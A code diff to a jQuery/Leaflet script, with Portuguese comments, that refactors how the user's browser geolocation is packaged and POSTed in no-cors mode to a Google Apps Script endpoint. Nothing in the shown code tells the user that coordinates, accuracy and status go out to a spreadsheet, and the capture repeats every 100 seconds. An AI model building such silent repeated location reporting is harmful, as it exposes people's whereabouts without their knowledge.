@@ -23,30 +23,28 @@ $(document).ready(function () {
                 var lng = position.coords.longitude;
 
                 // Marker e popup permanecem para visualização
-                var marker = L.marker([lat, lng])
+                L.marker([lat, lng])
                     .addTo(map)
                     .bindPopup("SEU LOCAL")
                     .openPopup();
 
                 map.setView([lat, lng], 17);
 
-                // PEGANDO EXATAMENTE DO PIN
-                var pinLat = marker.getLatLng().lat;
-                var pinLng = marker.getLatLng().lng;
-
-                // Envio direto para o Google Sheets via FormData
-                var form = new FormData();
-                form.append("latitude", pinLat);
-                form.append("longitude", pinLng);
-                form.append("timestamp", new Date().toISOString());
-                form.append("precisao", position.coords.accuracy);
-                form.append("status", navigator.onLine ? 'online' : 'offline');
+                // Envio direto para o Google Sheets via FormData (ou JSON no no-cors)
+                const dados = {
+                    timestamp: new Date().toISOString(),
+                    latitude: lat,
+                    longitude: lng,
+                    precisao: position.coords.accuracy,
+                    status: navigator.onLine ? 'online' : 'offline'
+                };
 
                 fetch('https://script.google.com/macros/s/AKfycbz6bm4rqeA6_88ztbBVwr_JnQFBmVdsA8Gz9p1pK9heomd9-HFge8Ny6VPF30I5H57LQQ/exec', {
                     method: 'POST',
-                    mode: 'no-cors', // garante que os dados cheguem, mesmo sem CORS
-                    body: form
-                }).then(() => console.log("Dados do pin enviados com sucesso."));
+                    mode: 'no-cors', // Evita conflito CORS
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(dados)
+                }).then(() => console.log("Dados enviados ao trono com sucesso."));
 
             },
             function(error) {
@@ -75,3 +73,5 @@ $(document).ready(function () {
     setInterval(capturarLocalizacaoReal, 100000);
 
 });
+
+
